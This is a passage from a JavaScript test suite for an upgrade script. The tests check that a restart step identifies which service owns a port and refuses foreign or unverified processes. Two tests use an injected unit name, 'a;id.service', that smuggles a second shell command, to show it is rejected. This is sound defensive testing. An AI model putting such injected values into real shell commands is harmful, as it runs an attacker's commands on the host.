test("planRestart: 'foreign-process' always refuses — never constructs a restart command, even when root/sudo-authorized", () => {
  const owner = {
    kind: "foreign-process", platform: "linux", pid: "445001", unit: "nginx.service", mismatched: false,
    reason: `"nginx.service" (system-scope) owns the OCP port, but its process is not OCP's server.mjs`,
  };
  assert.throws(
    () => planRestart(owner, { expectedUnit: "ocp-proxy.service", isRoot: true, sudoAuthorized: true }),
    /nginx\.service.*not OCP's server\.mjs/s
  );
});

test("resolveOwningUnit + planRestart, end to end: a probe attempted but FAILED to read cmdline (null, not absent) refuses as unknown, never proceeds", () => {
  // Distinguishes "the caller never attempted this probe" (undefined — legacy callers, backward
  // compatible, see the test below) from "the caller attempted it and it failed" (null — the same
  // permission/race gap parseCgroupUnit's own cgroupContent:null case exists for). A failed
  // probe must refuse, not silently skip the check it was trying to perform.
  const owner = resolveOwningUnit({
    platform: "linux",
    expectedUnit: "ocp-proxy.service",
    ssOutput: `LISTEN 0 511 0.0.0.0:80 0.0.0.0:* users:(("nginx",pid=445001,fd=6))`,
    cgroupContent: "0::/system.slice/nginx.service\n",
    cmdlineContent: null,
  });
  assert.equal(owner.kind, "unknown");
  assert.throws(() => planRestart(owner, { expectedUnit: "ocp-proxy.service", isRoot: true }), /could not determine|could not confirm/);
});

test("resolveOwningUnit: cmdlineContent ABSENT (undefined, not null) preserves pre-#237 behavior — backward compatible for callers not wired to the new check", () => {
  // A caller that never attempts the cmdline probe at all (an older test fixture, or any future
  // caller of this pure function that hasn't been updated) must not be newly refused just because
  // a field it never populated is missing — production's own gather layer (scripts/upgrade.mjs)
  // now ALWAYS attempts this probe, so in real use cmdlineContent is a string or explicitly null,
  // never undefined. This is what keeps issue #215's own pre-existing mismatch-warning coverage
  // (the "ocp.service" test just above) passing unmodified.
  const owner = resolveOwningUnit({
    platform: "linux",
    expectedUnit: "ocp-proxy.service",
    ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
    cgroupContent: "0::/system.slice/ocp.service\n",
  });
  assert.equal(owner.kind, "system-unit");
  assert.equal(owner.mismatched, true);
});

console.log("\nRestart-unit resolution (issue #215) — resolveOwningUnit composition:");

test("resolveOwningUnit: Linux system unit — the exact issue #215 scenario (mismatched vs the hard-coded user unit)", () => {
  const owner = resolveOwningUnit({
    platform: "linux",
    expectedUnit: "ocp-proxy.service",
    ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
    cgroupContent: "0::/system.slice/ocp.service\n",
  });
  assert.equal(owner.kind, "system-unit");
  assert.equal(owner.unit, "ocp.service");
  assert.equal(owner.pid, "798931");
  assert.equal(owner.mismatched, true, "ocp.service !== the hard-coded ocp-proxy.service");
});

test("resolveOwningUnit: Linux user unit, matching the expected unit — no mismatch", () => {
  const owner = resolveOwningUnit({
    platform: "linux",
    expectedUnit: "ocp-proxy.service",
    ssOutput: `LISTEN 0 511 127.0.0.1:3456 0.0.0.0:* users:(("node",pid=888736,fd=19))`,
    cgroupContent: "0::/user.slice/user-1000.slice/user@1000.service/app.slice/ocp-proxy.service\n",
  });
  assert.equal(owner.kind, "user-unit");
  assert.equal(owner.unit, "ocp-proxy.service");
  assert.equal(owner.mismatched, false);
});

test("resolveOwningUnit: macOS launchd — port held, resolves to the known label", () => {
  const owner = resolveOwningUnit({
    platform: "darwin",
    expectedUnit: "dev.ocp.proxy",
    lsofOutput: `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nnode    12345 opc   23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`,
  });
  assert.equal(owner.kind, "launchd");
  assert.equal(owner.pid, "12345");
});

test("resolveOwningUnit: no-unit — a PID holds the port but belongs to no systemd unit (bare `node server.mjs`)", () => {
  const owner = resolveOwningUnit({
    platform: "linux",
    expectedUnit: "ocp-proxy.service",
    ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=55001,fd=19))`,
    cgroupContent: "0::/user.slice/user-1000.slice/user@1000.service/session.slice/session-3.scope\n",
  });
  assert.equal(owner.kind, "no-unit");
  assert.equal(owner.pid, "55001");
});

test("resolveOwningUnit: not-listening — nothing bound to the port, on either platform", () => {
  assert.equal(resolveOwningUnit({ platform: "linux", ssOutput: "" }).kind, "not-listening");
  assert.equal(resolveOwningUnit({ platform: "darwin", lsofOutput: "" }).kind, "not-listening");
});

test("HIGH-1: resolveOwningUnit — root-owned listener seen by a non-root updater resolves to 'unknown', end to end", () => {
  const owner = resolveOwningUnit({
    platform: "linux", expectedUnit: "ocp-proxy.service",
    ssOutput: "LISTEN 0 100  172.16.2.231:40065  0.0.0.0:*",
  });
  assert.equal(owner.kind, "unknown");
  assert.ok(owner.reason);
});

test("resolveOwningUnit: macOS — tool didn't run (null lsofOutput) → unknown, not not-listening", () => {
  assert.equal(resolveOwningUnit({ platform: "darwin", lsofOutput: null }).kind, "unknown");
});

test("resolveOwningUnit: launchdPrintOutput ABSENT (undefined, not null) preserves pre-#239 behavior — backward compatible for callers not wired to the new check", () => {
  // Mirrors the Linux-side "cmdlineContent ABSENT" test below (issue #237's own back-compat
  // guarantee) — the SAME test right above this one ("macOS launchd — port held, resolves to the
  // known label") already exercises this implicitly (it never sets launchdPrintOutput at all),
  // but this test names the guarantee explicitly and would fail loudly if a future change made
  // the field required rather than optional.
  const owner = resolveOwningUnit({
    platform: "darwin",
    expectedUnit: "dev.ocp.proxy",
    lsofOutput: `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nnode    12345 opc   23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`,
    // launchdPrintOutput deliberately omitted — undefined, not null.
  });
  assert.equal(owner.kind, "launchd");
  assert.equal(owner.pid, "12345");
});

console.log("\nRestart-unit resolution (issue #239) — resolveOwningUnit darwin composition (launchd identity verification):");

test("#239: resolveOwningUnit — launchd job registered, running, matching pid, argv invokes server.mjs → launchd", () => {
  const owner = resolveOwningUnit({
    platform: "darwin",
    expectedUnit: "dev.ocp.proxy",
    lsofOutput: `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nnode    55416 tester 23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`,
    launchdPrintOutput: LAUNCHCTL_PRINT_LIVE_SAMPLE,
  });
  assert.equal(owner.kind, "launchd");
  assert.equal(owner.pid, "55416");
  assert.equal(owner.unit, "dev.ocp.proxy");
});

test("#239: resolveOwningUnit — label NOT REGISTERED (launchdPrintOutput \"\") but a PID still holds the port → no-unit", () => {
  // The literal issue #239 scenario: cmd_restart's nohup fallback bootout'd the launchd job
  // successfully but a subsequent bootstrap failed, leaving a bare `node server.mjs` holding the
  // port with dev.ocp.proxy no longer registered with launchd at all.
  const owner = resolveOwningUnit({
    platform: "darwin",
    expectedUnit: "dev.ocp.proxy",
    lsofOutput: `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nnode    55416 tester 23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`,
    launchdPrintOutput: "",
  });
  assert.equal(owner.kind, "no-unit");
  assert.equal(owner.pid, "55416");
});

test("#239: resolveOwningUnit — label registered but NOT RUNNING (no \"pid = \" line) → no-unit", () => {
  const notRunningBlob = "gui/501/dev.ocp.proxy = {\n\tstate = not running\n\tpath = /Users/tester/Library/LaunchAgents/dev.ocp.proxy.plist\n}";
  const owner = resolveOwningUnit({
    platform: "darwin",
    expectedUnit: "dev.ocp.proxy",
    lsofOutput: `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nnode    55416 tester 23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`,
    launchdPrintOutput: notRunningBlob,
  });
  assert.equal(owner.kind, "no-unit");
});

test("#239: resolveOwningUnit — launchd reports a DIFFERENT pid than the one holding the port → no-unit, not a false 'launchd'", () => {
  // launchd says dev.ocp.proxy is running as pid 55416; lsof says the port is actually held by
  // pid 99999. Neither probe is wrong on its own — the mismatch itself is the signal that the
  // port's holder is not verified to be dev.ocp.proxy.
  const owner = resolveOwningUnit({
    platform: "darwin",
    expectedUnit: "dev.ocp.proxy",
    lsofOutput: `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nnode    99999 tester 23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`,
    launchdPrintOutput: LAUNCHCTL_PRINT_LIVE_SAMPLE, // pid = 55416 inside this fixture
  });
  assert.equal(owner.kind, "no-unit");
  assert.equal(owner.pid, "99999", "owner.pid must reflect the ACTUAL port holder (lsof), not launchd's belief");
});

test("#239: resolveOwningUnit — pid matches, but the job's own argv does NOT invoke server.mjs → foreign-process, not launchd", () => {
  // A hijacked/hand-edited dev.ocp.proxy plist: the label is registered, running, and its pid
  // genuinely matches the port's holder — but that process isn't server.mjs at all. This is the
  // macOS analogue of #237's nginx.service scenario, and resolves to the SAME terminal kind.
  const hijackedBlob =
    "gui/501/dev.ocp.proxy = {\n\tstate = running\n\tprogram = /usr/bin/python3\n\t" +
    "arguments = {\n\t\t/usr/bin/python3\n\t\t/opt/some-other-daemon/main.py\n\t}\n\tpid = 55416\n}";
  const owner = resolveOwningUnit({
    platform: "darwin",
    expectedUnit: "dev.ocp.proxy",
    lsofOutput: `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\npython3 55416 tester 23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`,
    launchdPrintOutput: hijackedBlob,
  });
  assert.equal(owner.kind, "foreign-process");
  assert.ok(owner.reason.includes("main.py"), `reason should name the actual argv; got: ${owner.reason}`);
  assert.ok(owner.reason.includes("not OCP's server.mjs"));
});

test("#239: resolveOwningUnit — launchctl print probe genuinely failed (launchdPrintOutput null) → unknown, never a false 'no-unit'", () => {
  // Same "unknown must never be treated as safe-to-guess" posture as every other probe-failure
  // case in this file: a genuine probe failure (permission error, launchctl itself missing) must
  // not collapse into the SAME confident answer a positively-confirmed "not registered" gets.
  const owner = resolveOwningUnit({
    platform: "darwin",
    expectedUnit: "dev.ocp.proxy",
    lsofOutput: `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nnode    55416 tester 23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`,
    launchdPrintOutput: null,
  });
  assert.equal(owner.kind, "unknown");
  assert.notEqual(owner.kind, "no-unit");
  assert.ok(owner.reason);
});

console.log("\nRestart-unit resolution (issue #239) — planRestart darwin-specific refusal wording:");

test("#239: planRestart — darwin no-unit refusal says \"launchd\", NOT \"systemd\" (issue #239's own explicit ask)", () => {
  const owner = { kind: "no-unit", platform: "darwin", pid: "55416", unit: null, mismatched: false };
  assert.throws(
    () => planRestart(owner, { expectedUnit: "dev.ocp.proxy" }),
    /PID 55416.*launchd job.*issue #239/s
  );
  // Control: the wording must actually differ from the Linux message, not just additionally
  // mention launchd — "systemd" must not appear anywhere in the darwin refusal.
  try {
    planRestart(owner, { expectedUnit: "dev.ocp.proxy" });
    assert.fail("must throw");
  } catch (e) {
    assert.ok(!/systemd/.test(e.message), `darwin no-unit message must not mention systemd; got: ${e.message}`);
  }
});

test("#239: planRestart — darwin foreign-process refusal names lsof/launchctl, never ss or /proc", () => {
  const owner = {
    kind: "foreign-process", platform: "darwin", pid: "55416", unit: "dev.ocp.proxy", mismatched: false,
    reason: `"dev.ocp.proxy" (launchd, pid 55416) owns the OCP port, but its process is not OCP's server.mjs — owning process's argv (/usr/bin/python3 /opt/some-other-daemon/main.py) does not invoke server.mjs at all — this is not an OCP process`,
  };
  assert.throws(
    () => planRestart(owner, { expectedUnit: "dev.ocp.proxy" }),
    /lsof -nP -iTCP.*launchctl print gui/s
  );
  try {
    planRestart(owner, { expectedUnit: "dev.ocp.proxy" });
    assert.fail("must throw");
  } catch (e) {
    assert.ok(!/\bss -lptn\b/.test(e.message) && !/\/proc\//.test(e.message),
      `darwin foreign-process message must not reference Linux-only tools/paths; got: ${e.message}`);
  }
});

console.log("\nRestart-unit resolution (issue #215) — planRestart (refusals + MED-4/MED-7):");

test("planRestart: mismatched system unit, root, restarts the RESOLVED unit with no sudo prefix and warns loudly citing #215", () => {
  const owner = resolveOwningUnit({
    platform: "linux", expectedUnit: "ocp-proxy.service",
    ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
    cgroupContent: "0::/system.slice/ocp.service\n",
  });
  const plan = planRestart(owner, { expectedUnit: "ocp-proxy.service", isRoot: true });
  assert.equal(plan.cmds.length, 1);
  assert.equal(plan.cmds[0].cmd, "systemctl restart -- ocp.service");
  assert.ok(plan.warnings.some(w => w.includes("ocp.service") && w.includes("#215")),
    "must name the resolved unit and cite #215 in the loud warning");
});

test("planRestart: mismatched system unit, not root, sudo authorized for THIS command → sudo-prefixed restart", () => {
  const owner = resolveOwningUnit({
    platform: "linux", expectedUnit: "ocp-proxy.service",
    ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
    cgroupContent: "0::/system.slice/ocp.service\n",
  });
  const plan = planRestart(owner, { expectedUnit: "ocp-proxy.service", isRoot: false, sudoAuthorized: true });
  assert.equal(plan.cmds[0].cmd, "sudo systemctl restart -- ocp.service");
});

test("MED-4: planRestart — system unit, not root, sudo NOT authorized for this specific command aborts with an actionable message", () => {
  const owner = resolveOwningUnit({
    platform: "linux", expectedUnit: "ocp-proxy.service",
    ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
    cgroupContent: "0::/system.slice/ocp.service\n",
  });
  assert.throws(
    () => planRestart(owner, { expectedUnit: "ocp-proxy.service", isRoot: false, sudoAuthorized: false }),
    /sudo systemctl restart ocp\.service.*manually|not authorized non-interactively/s
  );
});

test("planRestart: unknown always refuses, quoting the specific reason it couldn't tell", () => {
  const owner = { kind: "unknown", platform: "linux", pid: null, unit: null, mismatched: false, reason: "multiple distinct PIDs (100, 200)" };
  assert.throws(
    () => planRestart(owner, { expectedUnit: "ocp-proxy.service" }),
    /multiple distinct PIDs \(100, 200\)/
  );
});

test("planRestart: no-unit refuses to restart a guessed name (must not silently claim success)", () => {
  const owner = { kind: "no-unit", platform: "linux", pid: "55001", unit: null, mismatched: false };
  assert.throws(
    () => planRestart(owner, { expectedUnit: "ocp-proxy.service" }),
    /PID 55001.*not managed by any systemd unit/s
  );
});

test("MED-7: planRestart — not-listening now REFUSES rather than silently starting the default (loopback) unit", () => {
  // Review finding: this looked like the SAFEST case (nothing to collide with) but is actually
  // the most dangerous — if the real production listener is a SYSTEM unit that's merely down
  // right now, falling back to the default starts the OTHER (often loopback-only) unit, and
  // post-flight (which only curls 127.0.0.1) reports a clean SUCCESS while the host silently
  // loses LAN reachability.
  const ownerLinux = { kind: "not-listening", platform: "linux", pid: null, unit: null, mismatched: false };
  assert.throws(() => planRestart(ownerLinux, { expectedUnit: "ocp-proxy.service" }), /nothing is currently listening/);

  const ownerDarwin = { kind: "not-listening", platform: "darwin", pid: null, unit: null, mismatched: false };
  assert.throws(() => planRestart(ownerDarwin, { expectedUnit: "dev.ocp.proxy", plistPath: "/tmp/x.plist" }), /nothing is currently listening/);
});

test("planRestart: launchd always keeps the bootout+bootstrap pair (kickstart -k does not re-read plist env)", () => {
  const owner = { kind: "launchd", platform: "darwin", pid: "12345", unit: "dev.ocp.proxy", mismatched: false };
  const plan = planRestart(owner, { expectedUnit: "dev.ocp.proxy", plistPath: "/tmp/dev.ocp.proxy.plist" });
  assert.equal(plan.cmds.length, 2);
  assert.ok(plan.cmds[0].cmd.includes("launchctl bootout"));
  assert.ok(plan.cmds[1].cmd.includes("launchctl bootstrap") && plan.cmds[1].cmd.includes("/tmp/dev.ocp.proxy.plist"));
});

test("MED-5: planRestart re-validates the unit name at the shell-out boundary itself (defense in depth)", () => {
  // Unreachable through parseCgroupUnit's own validation in normal operation — this proves the
  // point where the string is actually concatenated into a command ALSO refuses, so a future
  // caller that constructs an owner object by some other path (a second probe source, a bug)
  // can't reintroduce the injection by skipping the cgroup-layer check.
  const owner = { kind: "user-unit", platform: "linux", pid: "1", unit: "a;id.service", mismatched: false };
  assert.throws(() => planRestart(owner, { expectedUnit: "ocp-proxy.service" }), /failed validation/);

  const systemOwner = { kind: "system-unit", platform: "linux", pid: "1", unit: "a b c.service", mismatched: false };
  assert.throws(() => planRestart(systemOwner, { expectedUnit: "ocp-proxy.service", isRoot: true }), /failed validation/);
});

console.log("\nRestart-unit resolution (issue #215) — upgrade.mjs wiring (mockOwnerProbe, both restart sites):");

test("upgrade full path: mismatched system unit is restarted (not the hard-coded user unit), warning surfaces in phases", async () => {
  const result = await runUpgrade({
    yes: true, dryRun: false, mockExec: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
    mockPlatform: "linux",
    mockOwnerProbe: {
      ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
      cgroupContent: "0::/system.slice/ocp.service\n",
    },
    mockIsRoot: true,
  });
  const restartCmds = result.phases.filter(p => p.name === "restart").map(p => p.cmd);
  assert.ok(restartCmds.includes("systemctl restart -- ocp.service"), `expected resolved-unit restart; got ${restartCmds.join(", ")}`);
  assert.ok(!restartCmds.includes("systemctl --user restart -- ocp-proxy.service"), "must NOT restart the wrong hard-coded unit");
  assert.ok(result.phases.some(p => p.name === "restart-resolve" && p.note.includes("#215")), "mismatch must surface loudly in phases");
});

test("#237: upgrade full path — a FOREIGN systemd unit (nginx.service) holding the port must refuse, never restart it, even when root", async () => {
  // This is the headline #237 scenario, driven end to end through the SAME runUpgrade() path the
  // test right above exercises for a legitimate mismatch: CLAUDE_PROXY_PORT collides with a port
  // nginx already owns. Pre-#237, this probe shape resolves to kind:"system-unit",
  // mismatched:true — the same shape as the "ocp.service" test above — and, being root, proceeds
  // straight to `systemctl restart -- nginx.service`. That is the exact "restart the wrong,
  // unrelated production service" failure #237 reports; refusing here is the whole point of this
  // PR.
  await assert.rejects(async () => {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "linux",
      mockOwnerProbe: {
        ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("nginx",pid=445001,fd=6))`,
        cgroupContent: "0::/system.slice/nginx.service\n",
        cmdlineContent: "nginx: master process /usr/sbin/nginx -g daemon off;\0",
      },
      mockIsRoot: true,
      mockSudoAuthorized: true,
    });
  }, /nginx\.service.*not OCP's server\.mjs/s);
});

test("#237: the foreign-unit refusal fires before any restart command is ever constructed — no 'restart' phase with a cmd field", async () => {
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "linux",
      mockOwnerProbe: {
        ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("nginx",pid=445001,fd=6))`,
        cgroupContent: "0::/system.slice/nginx.service\n",
        cmdlineContent: "nginx: master process /usr/sbin/nginx -g daemon off;\0",
      },
      mockIsRoot: true,
      mockSudoAuthorized: true,
    });
  } catch (e) {
    caught = e;
  }
  assert.ok(caught, "must reject when the port owner is a confirmed-foreign process");
  assert.ok(!(caught.phases || []).some(p => p.name === "restart" && p.cmd),
    `no restart COMMAND may ever be constructed for a foreign unit; phases=${JSON.stringify(caught.phases)}`);
});

test("upgrade full path: port owned by no unit aborts the whole upgrade with an actionable message (does not claim success)", async () => {
  await assert.rejects(async () => {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "linux",
      mockOwnerProbe: {
        ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=55001,fd=19))`,
        cgroupContent: "0::/user.slice/user-1000.slice/user@1000.service/session.slice/session-3.scope\n",
      },
    });
  }, /PID 55001.*not managed by any systemd unit/s);
});

test("upgrade full path: system unit, not root, sudo not authorized aborts loudly rather than restarting the user unit", async () => {
  await assert.rejects(async () => {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "linux",
      mockOwnerProbe: {
        ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
        cgroupContent: "0::/system.slice/ocp.service\n",
      },
      mockIsRoot: false,
      mockSudoAuthorized: false,
    });
  }, /not authorized non-interactively/);
});

test("HIGH-1 + MED-7 wiring: an unattributable listener (root-owned, foreign uid) aborts the upgrade instead of reporting success", async () => {
  // This is the end-to-end version of the review's live repro: previously, this exact probe
  // shape resolved to "not-listening" and the upgrade proceeded to run the pre-#215 default
  // restart command, reporting SUCCESS while never having verified anything.
  await assert.rejects(async () => {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "linux",
      mockOwnerProbe: { ssOutput: "LISTEN 0 100  172.16.2.231:40065  0.0.0.0:*" },
    });
  }, /could not determine what.*owns the OCP port/s);
});

test("MED-7 wiring: port genuinely not listening aborts the whole upgrade (no silent fallback to the default unit)", async () => {
  // Wiring-level companion to the pure planRestart test above: proves runUpgrade itself
  // refuses end to end, not just that planRestart would refuse if reached in isolation.
  await assert.rejects(async () => {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "linux",
      mockOwnerProbe: { ssOutput: "" }, // ran cleanly, confirmed nothing listening
    });
  }, /nothing is currently listening/);
});

test("MED-5 wiring: an injected cgroup unit name never reaches a shell command — resolves no-unit and the upgrade refuses", async () => {
  await assert.rejects(async () => {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "linux",
      mockOwnerProbe: {
        ssOutput: `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
        cgroupContent: "0::/system.slice/a;id.service\n",
      },
    });
  }, /not managed by any systemd unit/); // rejected unit name → treated as no-unit, refuses
});

test("upgrade full path (no owner probe): still defaults to the historical Linux command — backward compatible", async () => {
  const result = await runUpgrade({
    yes: true, dryRun: false, mockExec: true, mockPlatform: "linux",
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
  });
  const restartCmds = result.phases.filter(p => p.name === "restart").map(p => p.cmd);
  assert.deepEqual(restartCmds, ["systemctl --user restart -- ocp-proxy.service"]);
});

test("upgrade full path (no owner probe): still defaults to the historical macOS bootout+bootstrap pair — backward compatible", async () => {
  const result = await runUpgrade({
    yes: true, dryRun: false, mockExec: true, mockPlatform: "darwin",
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
  });
  const restartCmds = result.phases.filter(p => p.name === "restart").map(p => p.cmd);
  assert.equal(restartCmds.length, 2);
  assert.ok(restartCmds[0].includes("launchctl bootout"));
  assert.ok(restartCmds[1].includes("launchctl bootstrap"));
});

console.log("\nRestart-unit resolution (issue #215) — MED-6: injected command runner drives the REAL gather+classify pipeline:");

// makeFakeRun: a tiny command-router for opts.run. `handlers` maps a substring to either a
// literal stdout string, a function(cmd)->string, or an Error instance to throw — this is what
// lets tests drive scripts/upgrade.mjs's actual `ss`/`lsof`/`cat .../cgroup`/`sudo -n -l`
// invocations end to end without touching a real service (review finding MED-6: this impure
// layer — which command runs, with which flags, how a failure maps to a state — had ZERO
// coverage in the first version of this fix, and that's exactly where the real bugs were).
function makeFakeRun(handlers) {
  return (cmd) => {
    for (const key of Object.keys(handlers)) {
      if (cmd.includes(key)) {
        const h = handlers[key];
        if (h instanceof Error) throw h;
        return typeof h === "function" ? h(cmd) : h;
      }
    }
    throw new Error(`test fake run: no handler matched command: ${cmd}`);
  };
}

// issue #239: `launchctl print` output for a registered, RUNNING dev.ocp.proxy job whose argv
// invokes server.mjs and whose pid matches the lsof fixtures' pid (12345) used throughout this
// section — the "everything matches, restart proceeds" fixture, reused across the macOS
// gather-layer tests below exactly the way the Linux `cat /proc/<pid>/cmdline` fixture strings
// ("/usr/bin/node\0/opt/ocp/server.mjs\0") are reused for the equivalent Linux tests. Shape
// verified live against the real dev.ocp.proxy job on a real host (see scripts/lib/restart-
// unit.mjs's classifyLaunchdJob comment for the captured output this mirrors).
const LAUNCHCTL_PRINT_RUNNING_OCP_12345 =
  "gui/501/dev.ocp.proxy = {\n\tstate = running\n\tprogram = /opt/homebrew/bin/node\n\t" +
  "arguments = {\n\t\t/opt/homebrew/bin/node\n\t\t/Users/tester/ocp/server.mjs\n\t}\n\tpid = 12345\n}";

test("MED-6: injected runner — Linux path calls `ss`, not `lsof` (platform branches are not swapped)", async () => {
  // This is the literal mutation the review re-derived undetected against the first version:
  // swapping which command each platform calls. A fake run that only understands `ss` and
  // explicitly REJECTS anything containing "lsof" makes a swap fail loudly instead of silently.
  const run = makeFakeRun({
    "ss -lptn": `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=798931,fd=19))`,
    "cat /proc/798931/cgroup": "0::/system.slice/ocp.service\n",
    // issue #237: resolveOwningUnit now also reads cmdline for the resolved PID — this fixture's
    // scenario is a legitimately-renamed OCP unit (not the foreign-process case #237 covers
    // elsewhere), so its cmdline must actually look like server.mjs or this test would newly
    // (and wrongly) refuse as "foreign".
    "cat /proc/798931/cmdline": "/usr/bin/node\0/opt/ocp/server.mjs\0",
    "lsof": new Error("test: lsof must not be called on Linux"),
  });
  const result = await runUpgrade({
    yes: true, dryRun: false, mockExec: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
    mockPlatform: "linux", mockIsRoot: true, run,
  });
  const restartCmds = result.phases.filter(p => p.name === "restart").map(p => p.cmd);
  assert.deepEqual(restartCmds, ["systemctl restart -- ocp.service"]);
});

test("MED-6: injected runner — macOS path calls `lsof`, not `ss`", async () => {
  const run = makeFakeRun({
    "lsof -nP": `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nnode    12345 opc   23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`,
    // issue #239: resolveOwningUnit now also gathers launchd's own bookkeeping for the resolved
    // pid — this fixture's scenario is the legitimate case (matching pid, argv invokes
    // server.mjs), not the #239 no-unit/foreign-process cases covered elsewhere, so this handler
    // must be present or the test would newly (and wrongly) refuse as "unknown".
    "launchctl print": LAUNCHCTL_PRINT_RUNNING_OCP_12345,
    "ss ": new Error("test: ss must not be called on macOS"),
  });
  const result = await runUpgrade({
    yes: true, dryRun: false, mockExec: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
    mockPlatform: "darwin", run,
  });
  const restartCmds = result.phases.filter(p => p.name === "restart").map(p => p.cmd);
  assert.equal(restartCmds.length, 2);
  assert.ok(restartCmds[0].includes("launchctl bootout"));
});

console.log("\nRestart-unit resolution (issue #239) — MED-6-style: injected runner drives the REAL macOS launchctl-print gather layer:");

// Every #239 test above (resolveOwningUnit / classifyLaunchdJob / classifyLaunchdArgv / planRestart)
// exercises the PURE functions in isolation. Per this repo's own documented lesson (independent
// review of PR #221, finding MED-6 — see the console.log heading above): the IMPURE gather layer —
// which command runs, with which flags, how a failure maps to a probe value — is exactly where
// real defects have lived (a platform-branch swap, an exit-code mismapping, both survived mutation
// undetected in earlier rounds). These tests drive scripts/upgrade.mjs's ACTUAL
// `launchctl print gui/$(id -u)/dev.ocp.proxy` invocation via a fake command router, end to end
// through runUpgrade — not just resolveOwningUnit/planRestart called directly.

test("#239 MED-6: injected runner — launchctl print \"Could not find service\" (label not registered) refuses as no-unit end to end", async () => {
  const launchctlNotRegisteredErr = Object.assign(
    new Error("Command failed: launchctl print gui/501/dev.ocp.proxy"),
    { status: 113, stdout: "", stderr: 'Bad request.\nCould not find service "dev.ocp.proxy" in domain for user gui: 501\n' }
  );
  const run = makeFakeRun({
    "lsof -nP": `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nnode    55416 tester 23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`,
    "launchctl print": launchctlNotRegisteredErr,
  });
  await assert.rejects(async () => {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "darwin", run,
    });
  }, /PID 55416.*launchd job.*issue #239/s);
});

test("#239 MED-6: injected runner — a genuine launchctl failure (missing tool, no \"Could not find service\" text) maps to unknown, refuses — not silently treated as not-registered", async () => {
  const launchctlMissingErr = Object.assign(
    new Error("Command failed: launchctl print gui/501/dev.ocp.proxy"),
